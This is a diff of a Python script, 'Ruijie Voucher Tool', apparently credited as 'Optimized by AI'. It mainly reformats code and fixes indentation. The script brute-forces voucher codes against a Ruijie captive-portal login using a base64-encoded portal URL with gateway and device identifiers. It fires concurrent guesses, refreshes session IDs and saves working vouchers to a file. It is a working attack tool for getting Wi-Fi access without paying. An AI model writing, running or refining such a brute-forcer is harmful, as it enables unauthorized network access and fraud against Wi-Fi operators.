@@ -14,15 +14,17 @@ import argparse
 SUCCESS = 0
 w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"
 
-def clear(): os.system("clear")
-def Line(): print(f"{y}-" * 50 + f"{w}")
+def clear(): 
+    os.system("clear")
+
+def Line(): 
+    print(f"{y}-" * 50 + f"{w}")
 
 def Logo():
     clear()
     print(f"{r}Ruijie Voucher Tool (Lite Version){g}\nCreated by ZD / Optimized by AI")
     Line()
 
-# Internet ရှိမရှိ Socket ဖြင့် စစ်ဆေးခြင်း (Root မလို)
 def check_internet(host="8.8.8.8", port=53, timeout=3):
     try:
         socket.setdefaulttimeout(timeout)
@@ -37,16 +39,17 @@ async def get_session_id(session, session_url):
         async with session.get(session_url, headers=headers) as req:
             session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
             return session_id
-    except: return None
+    except: 
+        return None
 
 class InternetAccess:
     def __init__(self):
-        # Ruijie WifiDog URL
-        # မူလ Code ထဲက self.session_url နေရာမှာ ဒါလေးနဲ့ အစားထိုးပါ
-self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
-
-        try: self.ip = open(".ip", "r").read().strip()
-        except: self.ip = "192.168.99.1"
+        # Corrected Base64 URL (Standard Padding applied)
+        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
+        try: 
+            self.ip = open(".ip", "r").read().strip()
+        except: 
+            self.ip = "192.168.99.1"
 
     async def execute(self):
         Logo()
@@ -77,8 +80,10 @@ async def login_voucher(session, session_id, voucher, debug=False):
                 SUCCESS += 1
                 print(f'{g}Success: {voucher}{w}')
                 with open("success.txt", "a") as f: f.write(voucher + "\n")
-            elif debug: print(f'{r}Failed: {voucher}{w}')
-    except: pass
+            elif debug: 
+                print(f'{r}Failed: {voucher}{w}')
+    except: 
+        pass
 
 def digit_generator(length):
     limit = 10**length
@@ -86,7 +91,8 @@ def digit_generator(length):
 
 async def brute_main(mode, length, speed, tasks, debug):
     vouchers = []
-    if mode == "digit": vouchers = digit_generator(length)
+    if mode == "digit": 
+        vouchers = digit_generator(length)
     else:
         vouchers = ["".join(random.choice(string.ascii_letters) for _ in range(length)) for _ in range(1000)]
     
@@ -97,10 +103,8 @@ async def brute_main(mode, length, speed, tasks, debug):
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=speed)) as session:
         loop_cnt = 0
         current_tasks = []
-        sid = await get_session_id(session, iobj.session_url)
-        
         for v in vouchers:
-            if loop_cnt % 50 == 0: # Refresh SID every 50 attempts
+            if loop_cnt % 50 == 0:
                 sid = await get_session_id(session, iobj.session_url)
             
             if sid:
@@ -127,4 +131,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-      
+
